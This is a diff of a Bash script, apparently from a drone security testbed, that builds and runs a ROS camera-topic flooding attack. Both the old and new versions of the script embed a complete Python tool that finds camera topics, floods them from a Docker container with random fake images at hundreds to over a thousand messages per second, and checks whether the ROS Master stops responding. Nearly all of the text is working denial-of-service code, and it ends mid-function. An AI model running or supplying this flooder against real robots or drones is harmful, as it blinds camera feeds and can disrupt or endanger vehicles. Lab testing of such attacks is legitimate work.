@@ -1,357 +1,362 @@
 #!/bin/bash
-# camera_ros_flood.sh - 카메라 피드 ROS 토픽 플러딩 공격 도구
-# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/camera_ros_flood.sh
+# camera_ros_flood_attack.sh - 카메라 피드 ROS 토픽 플러딩 공격
+# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/camera_ros_flood_attack.sh
+# Purpose: ROS 토픽을 대량의 가짜 카메라 데이터로 플러딩하여 RTSP 스트림 방해
 
 source "$(dirname "$0")/../common/colors.sh"
 source "$(dirname "$0")/../common/utils.sh"
 
 ATTACK_NAME="Camera Feed ROS Topic Flooding Attack"
-LOG_FILE="$(get_log_dir)/camera_ros_flood.log"
 
-print_banner() {
-    echo -e "${CYAN}"
-    echo "╔═══════════════════════════════════════╗"
-    echo "║      카메라 ROS 토픽 플러딩 공격     ║"
-    echo "╚═══════════════════════════════════════╝"
-    echo -e "${NC}"
+print_attack_banner() {
+    echo -e "${CYAN}============================================${NC}"
+    echo -e "${CYAN}    Camera Feed ROS Topic Flooding       ${NC}"
+    echo -e "${CYAN}============================================${NC}"
 }
 
-check_prerequisites() {
-    log_info "Checking prerequisites..."
+execute_ros_flood_attack() {
+    local ros_master_host=${1:-"10.13.0.5"}
+    local ros_master_port=${2:-"11311"}
+    local flood_mode=${3:-"camera_only"}
+    local duration=${4:-60}
     
-    local required_tools=("python3" "pip3" "docker")
-    for tool in "${required_tools[@]}"; do
-        if ! command -v "$tool" &> /dev/null; then
-            log_error "$tool is not installed"
-            exit 1
-        fi
-    done
+    log_info "Starting camera feed ROS topic flooding attack"
+    log_info "ROS Master: ${ros_master_host}:${ros_master_port}"
+    log_info "Flood mode: ${flood_mode}"
+    log_info "Duration: ${duration} seconds"
     
-    # Docker 실행 확인
-    if ! docker ps >/dev/null 2>&1; then
-        log_error "Docker is not running or accessible"
-        echo "Start Docker service: sudo systemctl start docker"
-        exit 1
+    # Docker 환경에서 ROS 공격 실행
+    setup_and_run_ros_attack "$ros_master_host" "$ros_master_port" "$flood_mode" "$duration"
+    local result=$?
+    
+    if [ $result -eq 0 ]; then
+        log_success "Camera ROS topic flooding attack completed successfully"
+        return 0
+    else
+        log_error "Camera ROS topic flooding attack failed"
+        return 1
     fi
-    
-    log_success "Prerequisites check completed"
 }
 
-detect_ros_environment() {
-    log_info "Detecting ROS environment..."
+setup_and_run_ros_attack() {
+    local ros_master_host="$1"
+    local ros_master_port="$2"
+    local flood_mode="$3"
+    local duration="$4"
     
-    local ros_master_candidates=()
-    local network_mode=""
+    log_info "Setting up ROS attack environment..."
+    
+    # ROS 공격 스크립트 생성
+    create_ros_flood_script
+    
+    # Docker 컨테이너 설정 및 공격 실행
+    local container_name="ros_flood_attacker_$(date +%s)"
+    local network_name="simulator"
+    local container_ip="10.13.0.10"
     
     # 네트워크 모드 감지
     if ip addr show | grep -q "192.168.13"; then
-        network_mode="wifi"
-        ros_master_candidates+=("192.168.13.5:11311")
-        log_info "WiFi mode detected"
-    elif ip addr show | grep -q "10.13.0"; then
-        network_mode="docker"
-        ros_master_candidates+=("10.13.0.5:11311")
-        log_info "Docker bridge mode detected"
-    else
-        network_mode="generic"
-        ros_master_candidates+=("127.0.0.1:11311")
-        log_warning "Generic network mode, using localhost"
+        network_name="host"
+        container_ip="192.168.13.10"
     fi
     
-    echo -e "${CYAN}Potential ROS Masters:${NC}"
-    for candidate in "${ros_master_candidates[@]}"; do
-        echo "  └─ $candidate"
-    done
+    log_info "Creating attack container: $container_name"
     
-    echo "$network_mode:${ros_master_candidates[*]}"
-}
-
-test_ros_connectivity() {
-    local ros_master="$1"
+    # Docker 컨테이너 실행
+    docker run -d \
+        --name "$container_name" \
+        --network="$network_name" \
+        --ip="$container_ip" \
+        -v "$(pwd)/ros_flood_attack.py:/tmp/ros_flood_attack.py" \
+        ros:noetic-ros-base \
+        bash -c "
+        export ROS_MASTER_URI=http://${ros_master_host}:${ros_master_port} && \
+        export ROS_IP=${container_ip} && \
+        source /opt/ros/noetic/setup.bash && \
+        apt-get update >/dev/null 2>&1 && \
+        apt-get install -y python3-pip >/dev/null 2>&1 && \
+        pip3 install numpy >/dev/null 2>&1 && \
+        python3 /tmp/ros_flood_attack.py $flood_mode $duration" \
+        > /dev/null 2>&1
     
-    log_info "Testing ROS connectivity to $ros_master..."
-    
-    local ip=$(echo "$ros_master" | cut -d: -f1)
-    local port=$(echo "$ros_master" | cut -d: -f2)
-    
-    # ROS Master 포트 연결 테스트
-    if timeout 5 bash -c "</dev/tcp/$ip/$port" 2>/dev/null; then
-        log_success "ROS Master connection to $ros_master successful"
+    if [ $? -eq 0 ]; then
+        log_success "Attack container started: $container_name"
+        
+        # 공격 진행 모니터링
+        monitor_attack_progress "$container_name" "$duration"
+        
+        # 컨테이너 정리
+        docker rm -f "$container_name" >/dev/null 2>&1
+        rm -f ros_flood_attack.py
+        
         return 0
     else
-        log_warning "ROS Master connection to $ros_master failed"
+        log_error "Failed to start attack container"
+        rm -f ros_flood_attack.py
         return 1
     fi
 }
 
-setup_ros_attack_container() {
-    local ros_master_ip="$1"
-    local container_ip="$2"
+create_ros_flood_script() {
+    log_info "Creating ROS topic flooding script..."
     
-    log_info "Setting up ROS attack container..."
-    
-    # 기존 컨테이너 정리
-    docker rm -f ros_flood_container 2>/dev/null || true
-    
-    echo -e "${YELLOW}[*] Pulling ROS Noetic image...${NC}"
-    if ! docker pull ros:noetic-ros-base >/dev/null 2>&1; then
-        log_error "Failed to pull ROS image"
-        return 1
-    fi
-    
-    echo -e "${YELLOW}[*] Starting ROS container...${NC}"
-    local container_id=$(docker run -d \
-        --network=simulator \
-        --ip="$container_ip" \
-        --name=ros_flood_container \
-        -e ROS_MASTER_URI="http://$ros_master_ip:11311" \
-        -e ROS_IP="$container_ip" \
-        ros:noetic-ros-base \
-        bash -c "source /opt/ros/noetic/setup.bash && sleep infinity")
-    
-    if [[ -z "$container_id" ]]; then
-        log_error "Failed to start ROS container"
-        return 1
-    fi
-    
-    echo -e "${YELLOW}[*] Installing Python dependencies...${NC}"
-    docker exec ros_flood_container bash -c "apt-get update && apt-get install -y python3 python3-pip python3-rospy python3-sensor-msgs python3-numpy" >/dev/null 2>&1
-    
-    log_success "ROS attack container ready: $container_id"
-    echo "$container_id"
-}
-
-create_ros_flooding_script() {
-    local script_path="/tmp/ros_topic_flood.py"
-    
-    cat > "$script_path" << 'EOF'
+    cat > ros_flood_attack.py << 'PYEOF'
 #!/usr/bin/env python3
-"""
-ROS 토픽 플러딩 공격 스크립트
-"""
 
 import rospy
+from sensor_msgs.msg import Image, CompressedImage
+from std_msgs.msg import Header
+import numpy as np
 import sys
 import time
 import threading
-import numpy as np
-from sensor_msgs.msg import Image, CompressedImage, PointCloud2, LaserScan
-from std_msgs.msg import Header
+import signal
 
 class ROSTopicFlooder:
     def __init__(self):
-        self.flooding_active = False
-        self.flood_threads = []
+        self.running = True
+        self.publishers = {}
         self.stats = {
             'messages_sent': 0,
-            'start_time': 0,
-            'topics_flooded': []
+            'start_time': time.time(),
+            'topics_flooded': 0
         }
+        
+        # 다양한 카메라 토픽들
+        self.camera_topics = [
+            ('/webcam/image_raw', 'sensor_msgs/Image'),
+            ('/camera/image_raw', 'sensor_msgs/Image'),
+            ('/camera/image_compressed', 'sensor_msgs/CompressedImage'),
+            ('/usb_cam/image_raw', 'sensor_msgs/Image'),
+            ('/front_camera/image_raw', 'sensor_msgs/Image'),
+            ('/rear_camera/image_raw', 'sensor_msgs/Image'),
+            ('/left_camera/image_raw', 'sensor_msgs/Image'),
+            ('/right_camera/image_raw', 'sensor_msgs/Image'),
+            ('/gimbal_camera/image_raw', 'sensor_msgs/Image'),
+            ('/thermal_camera/image_raw', 'sensor_msgs/Image')
+        ]
+        
+        signal.signal(signal.SIGINT, self.signal_handler)
+        signal.signal(signal.SIGTERM, self.signal_handler)
+    
+    def signal_handler(self, signum, frame):
+        print(f"\n[!] Attack interrupted. Messages sent: {self.stats['messages_sent']}")
+        self.stop_flooding()
     
     def init_ros_node(self):
         """ROS 노드 초기화"""
         try:
-            rospy.init_node('malicious_flooder', anonymous=True)
+            rospy.init_node('camera_flooder', anonymous=True)
             print("[+] ROS node initialized")
             return True
         except Exception as e:
             print(f"[-] ROS node initialization failed: {e}")
             return False
     
-    def discover_topics(self):
-        """활성 토픽 발견"""
-        print("[*] Discovering active topics...")
-        
+    def discover_active_topics(self):
+        """현재 활성화된 토픽 발견"""
         try:
-            # ROS Master에서 토픽 목록 가져오기
-            topic_list = rospy.get_published_topics()
+            print("[*] Discovering active topics...")
             
+            all_topics = rospy.get_published_topics()
             camera_topics = []
-            sensor_topics = []
             other_topics = []
             
-            for topic_name, topic_type in topic_list:
-                if any(keyword in topic_name.lower() for keyword in ['camera', 'image', 'webcam', 'video']):
+            for topic_name, topic_type in all_topics:
+                if any(keyword in topic_name.lower() for keyword in 
+                       ['camera', 'image', 'webcam', 'video', 'cam']):
                     camera_topics.append((topic_name, topic_type))
-                elif any(keyword in topic_name.lower() for keyword in ['scan', 'lidar', 'pointcloud', 'sensor']):
-                    sensor_topics.append((topic_name, topic_type))
                 else:
                     other_topics.append((topic_name, topic_type))
             
-            print(f"[+] Found {len(topic_list)} total topics")
-            print(f"[+] Camera topics: {len(camera_topics)}")
-            print(f"[+] Sensor topics: {len(sensor_topics)}")
-            print(f"[+] Other topics: {len(other_topics)}")
+            print(f"[+] Total topics found: {len(all_topics)}")
+            print(f"[+] Camera-related topics: {len(camera_topics)}")
             
-            return {
-                'camera': camera_topics,
-                'sensor': sensor_topics,
-                'other': other_topics
-            }
+            if camera_topics:
+                print("[*] Camera topics discovered:")
+                for topic, msg_type in camera_topics:
+                    print(f"    └─ {topic} ({msg_type})")
+            
+            return camera_topics, other_topics
             
         except Exception as e:
             print(f"[-] Topic discovery failed: {e}")
-            return None
+            return [], []
     
-    def create_fake_image_data(self, width=640, height=480, encoding="rgb8"):
-        """가짜 이미지 데이터 생성"""
+    def create_fake_image_message(self, width=640, height=480):
+        """가짜 이미지 메시지 생성"""
         img = Image()
         img.header = Header()
         img.header.stamp = rospy.Time.now()
-        img.header.frame_id = "camera_frame"
+        img.header.frame_id = "flooded_camera_frame"
         
         img.height = height
         img.width = width
-        img.encoding = encoding
+        img.encoding = "rgb8"
         img.is_bigendian = 0
-        img.step = width * 3  # RGB
+        img.step = width * 3
         
-        # 랜덤 이미지 데이터 생성 (큰 데이터)
-        data_size = img.step * height
-        img.data = np.random.bytes(data_size)
+        # 대용량 랜덤 이미지 데이터 생성
+        img.data = np.random.randint(0, 255, width * height * 3, dtype=np.uint8).tobytes()
         
         return img
     
     def create_fake_compressed_image(self):
-        """가짜 압축 이미지 데이터 생성"""
-        img = CompressedImage()
-        img.header = Header()
-        img.header.stamp = rospy.Time.now()
-        img.header.frame_id = "camera_frame"
+        """가짜 압축 이미지 메시지 생성"""
+        comp_img = CompressedImage()
+        comp_img.header = Header()
+        comp_img.header.stamp = rospy.Time.now()
+        comp_img.header.frame_id = "flooded_camera_frame"
+        comp_img.format = "jpeg"
         
-        img.format = "jpeg"
-        # 큰 압축 데이터 시뮬레이션
-        img.data = np.random.bytes(100000)  # 100KB
+        # 큰 더미 데이터 생성 (가짜 JPEG)
+        comp_img.data = np.random.randint(0, 255, 100000, dtype=np.uint8).tobytes()
         
-        return img
+        return comp_img
     
-    def create_fake_pointcloud(self):
-        """가짜 포인트클라우드 데이터 생성"""
-        cloud = PointCloud2()
-        cloud.header = Header()
-        cloud.header.stamp = rospy.Time.now()
-        cloud.header.frame_id = "lidar_frame"
-        
-        cloud.height = 1
-        cloud.width = 10000  # 많은 포인트
-        cloud.is_bigendian = False
-        cloud.point_step = 16  # 4 fields * 4 bytes
-        cloud.row_step = cloud.point_step * cloud.width
-        
-        # 큰 포인트 데이터
-        data_size = cloud.row_step * cloud.height
-        cloud.data = np.random.bytes(data_size)
-        
-        return cloud
-    
-    def flood_topic(self, topic_name, topic_type, rate_hz=1000, duration=60):
-        """특정 토픽 플러딩"""
-        print(f"[*] Flooding {topic_name} ({topic_type}) at {rate_hz} Hz")
-        
+    def setup_publisher(self, topic_name, msg_type):
+        """토픽 퍼블리셔 설정"""
         try:
-            # 토픽 타입에 따른 퍼블리셔 생성
-            if 'Image' in topic_type and 'Compressed' not in topic_type:
-                pub = rospy.Publisher(topic_name, Image, queue_size=10)
-                data_func = self.create_fake_image_data
-            elif 'CompressedImage' in topic_type:
-                pub = rospy.Publisher(topic_name, CompressedImage, queue_size=10)
-                data_func = self.create_fake_compressed_image
-            elif 'PointCloud2' in topic_type:
-                pub = rospy.Publisher(topic_name, PointCloud2, queue_size=10)
-                data_func = self.create_fake_pointcloud
+            if msg_type == 'sensor_msgs/Image':
+                pub = rospy.Publisher(topic_name, Image, queue_size=1000)
+            elif msg_type == 'sensor_msgs/CompressedImage':
+                pub = rospy.Publisher(topic_name, CompressedImage, queue_size=1000)
             else:
-                print(f"[-] Unsupported topic type: {topic_type}")
-                return
+                print(f"[-] Unsupported message type: {msg_type}")
+                return None
             
-            rate = rospy.Rate(rate_hz)
-            start_time = time.time()
-            message_count = 0
+            self.publishers[topic_name] = {
+                'publisher': pub,
+                'msg_type': msg_type,
+                'messages_sent': 0
+            }
             
-            while self.flooding_active and (time.time() - start_time) < duration:
-                try:
-                    # 가짜 데이터 생성 및 발행
-                    fake_data = data_func()
-                    pub.publish(fake_data)
-                    
-                    message_count += 1
-                    self.stats['messages_sent'] += 1
-                    
-                    if message_count % 100 == 0:
-                        print(f"[*] {topic_name}: {message_count} messages sent")
-                    
-                    rate.sleep()
-                    
-                except rospy.ROSInterruptException:
-                    break
-                except Exception as e:
-                    print(f"[-] Flooding error on {topic_name}: {e}")
-                    break
-            
-            print(f"[+] Flooding completed for {topic_name}: {message_count} messages")
+            print(f"[+] Publisher setup for {topic_name}")
+            return pub
             
         except Exception as e:
-            print(f"[-] Failed to flood {topic_name}: {e}")
+            print(f"[-] Publisher setup failed for {topic_name}: {e}")
+            return None
     
-    def flood_camera_topics(self, topics, rate_hz=500, duration=60):
-        """카메라 토픽들 동시 플러딩"""
-        print(f"[*] Starting camera topic flooding attack...")
-        print(f"[*] Rate: {rate_hz} Hz, Duration: {duration}s")
+    def flood_single_topic(self, topic_name, msg_type, rate_hz=1000, duration=60):
+        """단일 토픽 플러딩"""
+        print(f"[*] Flooding topic: {topic_name} at {rate_hz} Hz for {duration}s")
         
-        self.flooding_active = True
-        self.stats['start_time'] = time.time()
-        self.stats['topics_flooded'] = [topic[0] for topic in topics]
+        publisher = self.setup_publisher(topic_name, msg_type)
+        if not publisher:
+            return
         
-        # 각 토픽에 대해 별도 스레드로 플러딩
-        for topic_name, topic_type in topics:
+        rate = rospy.Rate(rate_hz)
+        start_time = time.time()
+        local_count = 0
+        
+        while self.running and (time.time() - start_time) < duration:
+            try:
+                if msg_type == 'sensor_msgs/Image':
+                    msg = self.create_fake_image_message()
+                elif msg_type == 'sensor_msgs/CompressedImage':
+                    msg = self.create_fake_compressed_image()
+                else:
+                    continue
+                
+                publisher.publish(msg)
+                local_count += 1
+                self.stats['messages_sent'] += 1
+                
+                if local_count % 100 == 0:
+                    elapsed = time.time() - start_time
+                    rate_actual = local_count / elapsed if elapsed > 0 else 0
+                    print(f"[*] {topic_name}: {local_count} msgs, {rate_actual:.1f} Hz")
+                
+                rate.sleep()
+                
+            except Exception as e:
+                print(f"[-] Error flooding {topic_name}: {e}")
+                break
+        
+        print(f"[+] Completed flooding {topic_name}: {local_count} messages sent")
+    
+    def flood_multiple_topics(self, topics, rate_hz=500, duration=60):
+        """다중 토픽 동시 플러딩"""
+        print(f"[*] Starting multi-topic flooding: {len(topics)} topics")
+        
+        threads = []
+        
+        for topic_name, msg_type in topics:
             thread = threading.Thread(
-                target=self.flood_topic,
-                args=(topic_name, topic_type, rate_hz, duration)
+                target=self.flood_single_topic,
+                args=(topic_name, msg_type, rate_hz, duration)
             )
             thread.daemon = True
             thread.start()
-            self.flood_threads.append(thread)
-            
-            # 스레드 시작 간격
-            time.sleep(0.1)
+            threads.append(thread)
+            time.sleep(0.1)  # 스레드 시작 간격
         
-        print(f"[+] Started flooding {len(topics)} camera topics")
+        # 모든 스레드 완료 대기
+        for thread in threads:
+            thread.join()
+        
+        self.stats['topics_flooded'] = len(topics)
     
-    def flood_default_topics(self, rate_hz=1000, duration=60):
-        """기본 카메라 토픽 플러딩"""
-        print("[*] Flooding default camera topics...")
+    def flood_camera_only(self, duration=60):
+        """카메라 토픽만 플러딩"""
+        print("[*] Camera-only flooding mode")
         
-        default_topics = [
-            ('/webcam/image_raw', 'sensor_msgs/Image'),
-            ('/camera/image_raw', 'sensor_msgs/Image'),
-            ('/camera/image_compressed', 'sensor_msgs/CompressedImage'),
-            ('/usb_cam/image_raw', 'sensor_msgs/Image'),
-            ('/front_camera/image_raw', 'sensor_msgs/Image')
-        ]
+        # 기본 카메라 토픽들 사용
+        active_cameras, _ = self.discover_active_topics()
         
-        self.flood_camera_topics(default_topics, rate_hz, duration)
+        if active_cameras:
+            print(f"[*] Flooding {len(active_cameras)} discovered camera topics")
+            self.flood_multiple_topics(active_cameras, 800, duration)
+        else:
+            print("[*] No active camera topics found, using default topics")
+            self.flood_multiple_topics(self.camera_topics[:5], 600, duration)
+    
+    def flood_aggressive(self, duration=60):
+        """공격적 플러딩 모드"""
+        print("[*] Aggressive flooding mode")
+        
+        active_cameras, other_topics = self.discover_active_topics()
+        
+        # 카메라 토픽 + 기본 토픽들 모두 공격
+        all_targets = active_cameras + self.camera_topics[:8]
+        
+        # 중복 제거
+        unique_targets = list(set(all_targets))
+        
+        print(f"[*] Aggressive flooding: {len(unique_targets)} total topics")
+        self.flood_multiple_topics(unique_targets, 1000, duration)
+    
+    def flood_discovery_mode(self, duration=60):
+        """발견된 모든 토픽 플러딩"""
+        print("[*] Discovery flooding mode")
+        
+        active_cameras, other_topics = self.discover_active_topics()
+        
+        if active_cameras:
+            self.flood_multiple_topics(active_cameras, 1500, duration)
+        else:
+            print("[!] No camera topics discovered, creating new topics")
+            self.flood_multiple_topics(self.camera_topics, 1200, duration)
     
     def monitor_system_impact(self, duration=30):
         """시스템 영향 모니터링"""
         print(f"[*] Monitoring system impact for {duration} seconds...")
         
         start_time = time.time()
-        initial_msg_count = self.stats['messages_sent']
         
         while time.time() - start_time < duration:
             try:
-                # 토픽 목록 다시 확인
                 current_topics = rospy.get_published_topics()
-                
-                # 메시지 전송 속도 계산
                 elapsed = time.time() - self.stats['start_time']
-                if elapsed > 0:
-                    msg_rate = self.stats['messages_sent'] / elapsed
-                    print(f"[*] Message rate: {msg_rate:.1f} msg/s")
+                msg_rate = self.stats['messages_sent'] / elapsed if elapsed > 0 else 0
                 
-                # ROS Master 상태 확인
+                print(f"[*] System status: {len(current_topics)} topics, {msg_rate:.1f} msg/s")
+                
+                # ROS Master 응답성 테스트
                 try:
                     rospy.get_master().getSystemState()
-                    print("[*] ROS Master responsive")
+                    print("[+] ROS Master responsive")
                 except:
                     print("[!] ROS Master unresponsive")
                 
@@ -360,46 +365,28 @@ class ROSTopicFlooder:
             except Exception as e:
                 print(f"[-] Monitoring error: {e}")
                 break
-        
-        final_msg_count = self.stats['messages_sent']
-        messages_this_period = final_msg_count - initial_msg_count
-        
-        print(f"[+] Monitoring completed")
-        print(f"[+] Messages sent during monitoring: {messages_this_period}")
-        
-        return messages_this_period
     
     def stop_flooding(self):
         """플러딩 중지"""
-        print("[*] Stopping flood attack...")
-        
-        self.flooding_active = False
-        
-        # 모든 스레드 종료 대기
-        for thread in self.flood_threads:
-            thread.join(timeout=5)
+        self.running = False
         
         elapsed = time.time() - self.stats['start_time']
         avg_rate = self.stats['messages_sent'] / elapsed if elapsed > 0 else 0
         
-        print(f"[+] Flooding stopped")
-        print(f"[+] Total messages sent: {self.stats['messages_sent']}")
-        print(f"[+] Average rate: {avg_rate:.1f} msg/s")
-        print(f"[+] Duration: {elapsed:.1f}s")
-        
-        return self.stats
+        print("\n[+] Flooding attack completed")
+        print(f"    Total messages sent: {self.stats['messages_sent']}")
+        print(f"    Topics flooded: {self.stats['topics_flooded']}")
+        print(f"    Duration: {elapsed:.1f} seconds")
+        print(f"    Average rate: {avg_rate:.1f} messages/second")
 
 def main():
     if len(sys.argv) < 2:
-        print("Usage: python3 ros_topic_flood.py <action> [options]")
-        print("Actions:")
-        print("  discover                    - Discover active topics")
-        print("  flood_default <rate> <dur>  - Flood default camera topics")
-        print("  flood_topic <name> <type> <rate> <dur> - Flood specific topic")
-        print("  monitor <duration>          - Monitor system impact")
+        print("Usage: python3 ros_flood_attack.py <mode> [duration]")
+        print("Modes: camera_only, aggressive, discovery, monitor")
         sys.exit(1)
     
-    action = sys.argv[1]
+    mode = sys.argv[1]
+    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
     
     flooder = ROSTopicFlooder()
     
@@ -408,492 +395,185 @@ def main():
         sys.exit(1)
     
     try:
-        if action == "discover":
-            topics = flooder.discover_topics()
-            if topics:
-                print("\n[+] Camera Topics:")
-                for topic_name, topic_type in topics['camera']:
-                    print(f"  └─ {topic_name} ({topic_type})")
-                
-                print("\n[+] Sensor Topics:")
-                for topic_name, topic_type in topics['sensor'][:5]:  # 처음 5개만
-                    print(f"  └─ {topic_name} ({topic_type})")
+        print(f"[*] Starting ROS topic flooding attack")
+        print(f"[*] Mode: {mode}, Duration: {duration} seconds")
+        print(f"[*] Press Ctrl+C to stop")
         
-        elif action == "flood_default":
-            rate = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
-            duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
-            
-            flooder.flood_default_topics(rate, duration)
-            
-            # 플러딩 중 모니터링
-            time.sleep(5)  # 플러딩 시작 대기
-            flooder.monitor_system_impact(min(30, duration-5))
-            
-            flooder.stop_flooding()
-        
-        elif action == "flood_topic":
-            if len(sys.argv) < 5:
-                print("Usage: flood_topic <topic_name> <topic_type> <rate> <duration>")
-                sys.exit(1)
-            
-            topic_name = sys.argv[2]
-            topic_type = sys.argv[3]
-            rate = int(sys.argv[4])
-            duration = int(sys.argv[5])
-            
-            flooder.flood_camera_topics([(topic_name, topic_type)], rate, duration)
-            flooder.stop_flooding()
-        
-        elif action == "monitor":
-            duration = int(sys.argv[2]) if len(sys.argv) > 2 else 30
+        if mode == "camera_only":
+            flooder.flood_camera_only(duration)
+        elif mode == "aggressive":
+            flooder.flood_aggressive(duration)
+        elif mode == "discovery":
+            flooder.flood_discovery_mode(duration)
+        elif mode == "monitor":
             flooder.monitor_system_impact(duration)
-        
         else:
-            print(f"[-] Unknown action: {action}")
-    
+            print(f"[-] Unknown mode: {mode}")
+            sys.exit(1)
+        
+        flooder.stop_flooding()
+        
     except KeyboardInterrupt:
-        print("\n[*] Interrupted by user")
+        print("\n[!] Attack interrupted by user")
         flooder.stop_flooding()
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f"[-] Attack failed: {e}")
         flooder.stop_flooding()
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
-EOF
-
-    chmod +x "$script_path"
-    echo "$script_path"
+PYEOF
+    
+    log_success "ROS flood script created"
 }
 
-execute_ros_flooding_attack() {
-    local container_id="$1"
-    local attack_type="$2"
-    local rate="${3:-1000}"
-    local duration="${4:-60}"
+monitor_attack_progress() {
+    local container_name="$1"
+    local duration="$2"
     
-    log_info "Executing ROS topic flooding attack..."
+    log_info "Monitoring attack progress for ${duration} seconds..."
     
-    local script_path=$(create_ros_flooding_script)
+    local elapsed=0
+    local check_interval=10
     
-    echo -e "${YELLOW}[*] Copying attack script to container...${NC}"
-    docker cp "$script_path" "$container_id:/tmp/ros_topic_flood.py"
-    
-    echo -e "${YELLOW}[*] Attack Type: $attack_type${NC}"
-    echo -e "${YELLOW}[*] Rate: $rate Hz, Duration: ${duration}s${NC}"
-    echo -e "${CYAN}[*] Executing attack...${NC}"
-    
-    local attack_output=""
-    local success=false
-    
-    case "$attack_type" in
-        "discover")
-            echo -e "${CYAN}[*] Discovering ROS topics${NC}"
-            attack_output=$(docker exec "$container_id" bash -c "
-                source /opt/ros/noetic/setup.bash && 
-                python3 /tmp/ros_topic_flood.py discover
-            " 2>&1)
-            [[ $? -eq 0 ]] && success=true
-            ;;
-        "camera_flood")
-            echo -e "${RED}[!] Flooding camera topics${NC}"
-            attack_output=$(docker exec "$container_id" bash -c "
-                source /opt/ros/noetic/setup.bash && 
-                timeout $((duration + 10)) python3 /tmp/ros_topic_flood.py flood_default $rate $duration
-            " 2>&1)
-            [[ $? -eq 0 ]] && success=true
-            ;;
-        "specific_flood")
-            local topic_name="/webcam/image_raw"
-            local topic_type="sensor_msgs/Image"
-            echo -e "${RED}[!] Flooding specific topic: $topic_name${NC}"
-            attack_output=$(docker exec "$container_id" bash -c "
-                source /opt/ros/noetic/setup.bash && 
-                timeout $((duration + 10)) python3 /tmp/ros_topic_flood.py flood_topic '$topic_name' '$topic_type' $rate $duration
-            " 2>&1)
-            [[ $? -eq 0 ]] && success=true
-            ;;
-        "monitor")
-            echo -e "${CYAN}[*] Monitoring system impact${NC}"
-            attack_output=$(docker exec "$container_id" bash -c "
-                source /opt/ros/noetic/setup.bash && 
-                python3 /tmp/ros_topic_flood.py monitor $duration
-            " 2>&1)
-            [[ $? -eq 0 ]] && success=true
-            ;;
-    esac
-    
-    echo "$attack_output"
-    
-    if $success; then
-        log_success "ROS flooding attack executed successfully"
-    else
-        log_warning "ROS flooding attack may have failed"
-    fi
-    
-    rm -f "$script_path"
-    
-    echo "$success:$attack_output"
-}
-
-check_ros_topics() {
-    local container_id="$1"
-    
-    log_info "Checking available ROS topics..."
-    
-    local script_path=$(create_ros_flooding_script)
-    docker cp "$script_path" "$container_id:/tmp/ros_topic_flood.py"
-    
-    echo -e "${CYAN}Discovering ROS topics...${NC}"
-    
-    local topics_output=$(docker exec "$container_id" bash -c "
-        source /opt/ros/noetic/setup.bash && 
-        python3 /tmp/ros_topic_flood.py discover
-    " 2>&1)
-    
-    echo "$topics_output"
-    
-    # 토픽 개수 분석
-    local camera_topics=$(echo "$topics_output" | grep -c "camera\|image\|webcam" || echo "0")
-    local total_topics=$(echo "$topics_output" | grep "Found.*total topics" | grep -o '[0-9]\+' | head -1 || echo "0")
-    
-    echo -e "${GREEN}=== Topic Discovery Summary ===${NC}"
-    echo "  └─ Total topics: $total_topics"
-    echo "  └─ Camera-related topics: $camera_topics"
-    
-    if [[ $camera_topics -gt 0 ]]; then
-        echo -e "${GREEN}  └─ Camera topics available for flooding${NC}"
-    else
-        echo -e "${YELLOW}  └─ No camera topics found${NC}"
-    fi
-    
-    rm -f "$script_path"
-}
-
-perform_escalating_flood_attack() {
-    local container_id="$1"
-    
-    log_info "Performing escalating ROS flood attack..."
-    
-    local flood_stages=(
-        "discover:Topic discovery:0:10"
-        "monitor:Baseline monitoring:0:20"
-        "camera_flood:Camera flood (low):100:30"
-        "camera_flood:Camera flood (medium):500:30"
-        "camera_flood:Camera flood (high):1000:30"
-        "camera_flood:Camera flood (extreme):2000:30"
-    )
-    
-    echo -e "${GREEN}=== Escalating ROS Flood Attack ===${NC}"
-    
-    local stage_results=()
-    local successful_stages=0
-    
-    for stage in "${flood_stages[@]}"; do
-        local attack_type=$(echo "$stage" | cut -d: -f1)
-        local description=$(echo "$stage" | cut -d: -f2)
-        local rate=$(echo "$stage" | cut -d: -f3)
-        local duration=$(echo "$stage" | cut -d: -f4)
+    while [ $elapsed -lt $duration ]; do
+        sleep $check_interval
+        elapsed=$((elapsed + check_interval))
         
-        echo -e "\n${CYAN}[*] Stage: $description${NC}"
-        
-        if [[ "$attack_type" == "discover" ]]; then
-            check_ros_topics "$container_id"
-            stage_results+=("$description:SUCCESS")
-            ((successful_stages++))
+        # 컨테이너 상태 확인
+        if docker ps --format "table {{.Names}}" | grep -q "$container_name"; then
+            echo -e "${GREEN}[*] Attack progress: ${elapsed}/${duration}s - Container running${NC}"
         else
-            local result=$(execute_ros_flooding_attack "$container_id" "$attack_type" "$rate" "$duration")
-            local success=$(echo "$result" | cut -d: -f1)
-            
-            if [[ "$success" == "true" ]]; then
-                ((successful_stages++))
-                stage_results+=("$description:SUCCESS")
-                echo -e "${GREEN}  └─ Stage succeeded${NC}"
-            else
-                stage_results+=("$description:FAILED")
-                echo -e "${RED}  └─ Stage failed${NC}"
-            fi
-        fi
-        
-        # 단계 간 대기 (시스템 회복 시간)
-        echo -e "${YELLOW}  └─ Waiting for system recovery...${NC}"
-        sleep 10
-    done
-    
-    echo -e "\n${GREEN}=== Flood Attack Summary ===${NC}"
-    echo "  └─ Total stages: ${#flood_stages[@]}"
-    echo "  └─ Successful stages: $successful_stages"
-    echo "  └─ Success rate: $((successful_stages * 100 / ${#flood_stages[@]}))%"
-    
-    echo -e "\n${CYAN}Stage Details:${NC}"
-    for result in "${stage_results[@]}"; do
-        local desc=$(echo "$result" | cut -d: -f1)
-        local status=$(echo "$result" | cut -d: -f2)
-        
-        if [[ "$status" == "SUCCESS" ]]; then
-            echo "  └─ $desc: ${GREEN}$status${NC}"
-        else
-            echo "  └─ $desc: ${RED}$status${NC}"
-        fi
-    done
-    
-    echo "$successful_stages:${#flood_stages[@]}"
-}
-
-monitor_rtsp_stream_impact() {
-    local duration="${1:-30}"
-    
-    log_info "Monitoring RTSP stream impact..."
-    
-    echo -e "${YELLOW}[*] Monitoring RTSP stream for ${duration} seconds...${NC}"
-    
-    # RTSP 스트림 URL 후보들
-    local rtsp_urls=(
-        "rtsp://192.168.13.1:8554/webcam"
-        "rtsp://10.13.0.3:8554/webcam"
